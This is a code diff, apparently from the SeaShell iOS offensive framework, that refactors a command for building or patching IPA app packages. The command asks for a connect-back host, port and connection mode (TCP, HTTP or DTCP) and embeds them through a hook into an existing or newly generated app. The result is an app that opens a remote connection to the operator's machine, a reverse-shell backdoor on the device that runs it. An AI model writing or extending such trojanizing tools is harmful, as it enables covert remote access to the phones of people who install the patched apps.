@@ -6,6 +6,12 @@ Current source: https://github.com/EntySec/SeaShell
 from seashell.core.ipa import IPA
 from seashell.core.hook import Hook
 
+from seashell.core.device import (
+    MODE_TCP,
+    MODE_HTTP,
+    MODE_DTCP
+)
+
 from pex.proto.tcp import TCPTools
 
 from badges.cmd import Command
@@ -58,9 +64,29 @@ class ExternalCommand(Command):
             ipa = IPA(args[2], args[3])
             ipa.generate(args[1])
 
-    def run(self, args):
+    def prompt_user(self):
         local_host = TCPTools.get_local_host()
+        modes = [MODE_TCP, MODE_HTTP, MODE_DTCP]
 
+        host = self.input_arrow(f"Host to connect back ({local_host}): ")
+        host = host or local_host
+
+        while True:
+            mode = self.input_arrow(f"Mode to use for connection ({'|'.join(modes)}): ")
+            mode = mode or MODE_TCP
+
+            if mode in modes:
+                break
+
+            self.print_warning("Unsupported mode specified.")
+
+        local_port = 8080 if mode == MODE_HTTP else 8888
+        port = self.input_arrow(f"Port to connect back ({str(local_port)}): ")
+        port = port or local_port
+
+        return host, port, mode
+
+    def run(self, args):
         if args.check:
             if IPA(None, None).check_ipa(args.check):
                 self.print_information("IPA is built or patched.")
@@ -72,13 +98,7 @@ class ExternalCommand(Command):
                 self.print_warning("This IPA was already patched.")
                 return
 
-            host = self.input_arrow(f"Host to connect back ({local_host}): ")
-            host = host or local_host
-
-            port = self.input_arrow("Port to connect back (8888): ")
-            port = port or 8888
-
-            hook = Hook(host, port)
+            hook = Hook(*self.prompt_user())
             hook.patch_ipa(args.patch)
 
             self.print_success(f"IPA at {args.patch} patched!")
@@ -93,15 +113,9 @@ class ExternalCommand(Command):
             if icon.lower() in ['y', 'yes']:
                 icon_path = self.input_arrow("Icon file path: ")
 
-            host = self.input_arrow(f"Host to connect back ({local_host}): ")
-            host = host or local_host
-
-            port = self.input_arrow("Port to connect back (8888): ")
-            port = port or 8888
-
             path = self.input_arrow("Path to save the IPA: ")
 
-            ipa = IPA(host, port)
+            ipa = IPA(*self.prompt_user())
             ipa.set_name(name, bundle_id)
 
             if icon_path:
